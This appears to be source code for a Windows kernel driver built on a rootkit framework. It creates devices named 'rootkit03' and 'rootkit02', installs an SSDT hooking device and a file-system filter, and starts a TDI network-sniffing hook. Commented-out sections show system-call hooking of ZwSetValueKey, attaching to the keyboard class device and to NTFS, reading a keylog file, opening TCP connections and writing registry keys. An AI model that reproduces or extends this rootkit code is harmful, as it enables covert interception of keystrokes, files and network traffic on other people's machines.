#include "RDF.h"

using namespace RDF;
using namespace RDF::FileManager;
using namespace RDF::RegistryManager;
using namespace RDF::Tdi;
SSDTDevice* Amr;
FileFilterDevice* Amr2;
TdiTcpSocket* Amr3;
TdiSniffer* Amr4;
FileToWrite* s;
PDRIVER_OBJECT DriverObject;
typedef NTSTATUS ZwSetValueKeyPtr(
            IN HANDLE KeyHandle,
            IN PUNICODE_STRING ValueName,
            IN ULONG TitleIndex OPTIONAL,
            IN ULONG Type,
            IN PVOID Data,
            IN ULONG DataSize
            );
            
ZwSetValueKeyPtr* oldZwSetValueKey;
VOID DriverNotificationRoutine(PDEVICE_OBJECT TargetDevice,int command);
int _cdecl MJCreate(FileFilterDevice* FFDevice,__in PDEVICE_OBJECT DeviceObject,__in PIRP Irp);
NTSTATUS NewNtQueryDirectoryFile(IN HANDLE FileHandle,
                                 IN HANDLE Event OPTIONAL,
                                 IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
                                 IN PVOID ApcContext OPTIONAL,
                                 OUT PIO_STATUS_BLOCK IoStatusBlock,
                                 OUT PVOID FileInformation,
                                 IN ULONG FileInformationLength,
                                 IN FILE_INFORMATION_CLASS FileInformationClass,
                                 IN BOOLEAN ReturnSingleEntry,
                                 IN PUNICODE_STRING FileName OPTIONAL,
                                 IN BOOLEAN RestartScan
                                  );
//------------------------------------------------------------------
NTSTATUS newZwSetValueKey(IN HANDLE KeyHandle,IN PUNICODE_STRING ValueName,IN ULONG TitleIndex OPTIONAL,IN ULONG Type,IN PVOID Data,IN ULONG DataSize)
{   
    //DbgPrint("Yes %wZ\n",ValueName);
    return (*oldZwSetValueKey)(KeyHandle,ValueName,TitleIndex,Type,Data,DataSize);
}
//------------------------------------------------------------------
VOID TdiReceiveEvent(TdiTcpSocket* Sock,char* Buffer,DWORD Size)
{
     DbgPrint("RECEIVED DATA !!!");
}
VOID TdiDisconnectEvent(TdiTcpSocket* Sock)
{
     DbgPrint("DISCONNECTED !!!");
     //if(Amr3->Listen() != STATUS_SUCCESS)DbgPrint("Error");
}
int MyReceiveEvent(TdiTcpSocket* Sock,int PID, char* Buffer,DWORD* Size,PVOID UserContext)
{
     //DbgPrint("From My Function !!!");
     //DbgPrint("Size : %x",*Size);
     //s->write(Buffer,*Size);
     return TDISNIFFER_ALLOW;
}
NTSTATUS Driver::DriverMain(IN PDRIVER_OBJECT pDriverObject,IN PUNICODE_STRING theRegistryPath){
      DbgPrint("HideProc DriverEntry Called\n");
      DriverObject = pDriverObject;
       
      //s = (FileToWrite*)misc::CreateClass(sizeof(FileToWrite));
      //s->open(L"\\DosDevices\\C:\\KernelCreatedFile03.txt",true);
      
      Amr2=(FileFilterDevice*)misc::CreateClass(sizeof(FileFilterDevice));
      Amr2->Initialize(this);
      AddDevice(Amr2);
      
      Amr=(SSDTDevice*)misc::CreateClass(sizeof(SSDTDevice));
      Amr->Initialize(this);
      AddDevice(Amr);
      
      //Amr3 = (TdiTcpSocket*)misc::CreateClass(sizeof(TdiTcpSocket));
      //Amr3->Initialize(this);
      //AddDevice(Amr3);
      
      Amr4=(TdiSniffer*)misc::CreateClass(sizeof(TdiSniffer));
      Amr4->Initialize(this);
      AddDevice(Amr4);
      
      Amr4->BeginHooking(true);
      //SetValue(Amr4->ReceiveEvent,MyReceiveEvent);
      //SetValue(Amr4->SendEvent,MyReceiveEvent);
      //Amr3->ReceiveEventFunc = TdiReceiveEvent;
      //Amr3->DisconnectEventFunc = TdiDisconnectEvent;
      Amr->CreateDevice(L"\\Device\\rootkit03",L"\\DosDevices\\rootkit03");
      Amr2->CreateDevice(L"\\Device\\rootkit02",L"\\DosDevices\\rootkit02");
      //Amr3->CreateDevice(L"\\Device\\rootkit02",L"\\DosDevices\\rootkit01");
      //if (Amr3->InitializeConnection(TCP_SOCKET_CLIENT,4003) != STATUS_SUCCESS)DbgPrint("Error Initializing Connection");
      //DWORD RemoteAddr;
      //USHORT port;
      //Amr3->Listen();
      //Amr3->Connect(127,0,0,1,4400);
      //DWORD DataSent;
      //Amr3->Send("I'm Amoor",strlen("I'm Amoor"),&DataSent);
      
      
      //
      //
      //LARGE_INTEGER interval;
      //interval.QuadPart = 7 * DELAY_ONE_SECOND;
      //KeDelayExecutionThread(KernelMode,FALSE,&interval);
      
      //Amr3->Disconnect();
      //Amr3->DeinitializeConnection();
      //Amr->AttachTo(L"ZwSetValueKey",(DWORD)newZwSetValueKey);
      //int old = Amr->GetRealAddress(L"ZwSetValueKey");
      //DbgPrint("Real Address : 0x%x",old);
      //SetValue(oldZwSetValueKey,old);
      //Amr2->AttachToDevice(L"\\FileSystem\\ntfs",FILE_DEVICE_DISK_FILE_SYSTEM);
      //Amr2->AttachToDevice(L"\\Device\\KeyboardClass0");
      //Amr2->AttachToDevice(Amr->pDeviceObject);
      
      //IoRegisterFsRegistrationChange(pDriverObject, (PDRIVER_FS_NOTIFICATION)DriverNotificationRoutine);
      
      //Amr->UserComm.Write(1,STATUS_SUCCESS,"I'm Amoor",sizeof("I'm Amoor"));
      //DbgPrint("Old Value = 0x%x",(DWORD)oldZwSetValueKey);
      //
      
      //Amr2->BeginHooking(true);
      
      //SetValue(Amr2->FilteredMajorFunction[IRP_MJ_CREATE].PreModification,MJCreate);
      
      //FileToRead* readfile = (FileToRead*)misc::CreateClass(sizeof(FileToRead));
      //NTSTATUS ntStatus = readfile->open(L"\\DosDevices\\c:\\KeyLog2dfdfdf.txt");
      //if (ntStatus != STATUS_SUCCESS)DbgPrint("02.cpp : Failed To ReadFile");
      //readfile->close();
      /*
      else DbgPrint("02.cpp : ReadFile Opened Successfully");
      char* data;
      DWORD size;
      readfile->read(data,size);
      DbgPrint("FileData at : %x ... and FileSize is : %x",data,size);
      DbgPrint("Text: %s",data);
      readfile->close();
      
      FileToWrite* s = (FileToWrite*)misc::CreateClass(sizeof(FileToWrite));
      s->open(L"\\DosDevices\\c:\\NewData.txt",false);
      s->write("I'm Amoooooor ... From KernelMode\n",strlen("I'm Amoooooor ... From KernelMode\n"));
      s->close();
      
      char* buf = RegRead(L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion",L"ProgramFilesDir",size);
      //if(buf != 0)DbgPrint("Registry Read : %x",buf);
      
      s = (FileToWrite*)misc::CreateClass(sizeof(FileToWrite));
      s->open(L"\\DosDevices\\c:\\Reg.txt",false);
      s->write(buf,size);
      s->close();
      
      RegWrite(L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion",L"AmrThabet",(char*)L"AmrThabet Amoor",REG_SZ,strlen("AmrThabet Amoor")*2);
      //*/
      return STATUS_SUCCESS;
}
VOID DriverNotificationRoutine(PDEVICE_OBJECT TargetDevice,int command)
{
    DbgPrint("IRQL From NotificationRoutine : %x",KeGetCurrentIrql());
    if (command == TRUE)
    {
       Amr2->AttachToDevice(TargetDevice);
       DbgPrint("Notification : Device Attached");
       //IoUnregisterFsRegistrationChange(DriverObject, (PDRIVER_FS_NOTIFICATION)DriverNotificationRoutine);
    }else
    {
       Amr2->DetachDevice(TargetDevice);
       DbgPrint("Notification : Device Detached"); 
    }
};
VOID Driver::DriverUnload()
{
     //s->close();
     DbgPrint("Device Detached");
     //Amr3->DeinitializeConnection();
     //IoUnregisterFsRegistrationChange(DriverObject, (PDRIVER_FS_NOTIFICATION)DriverNotificationRoutine);
     //Amr->Detach();
}
int _cdecl MJCreate(FileFilterDevice* FFDevice,__in PDEVICE_OBJECT DeviceObject,__in PIRP Irp)
{
    PFILE_OBJECT pFileObject = IoGetCurrentIrpStackLocation(Irp)->FileObject;
    DbgPrint("File Created !!!");         
    DbgPrint("%wZ\n", &pFileObject->FileName);
    return FILTER_SKIP;
}
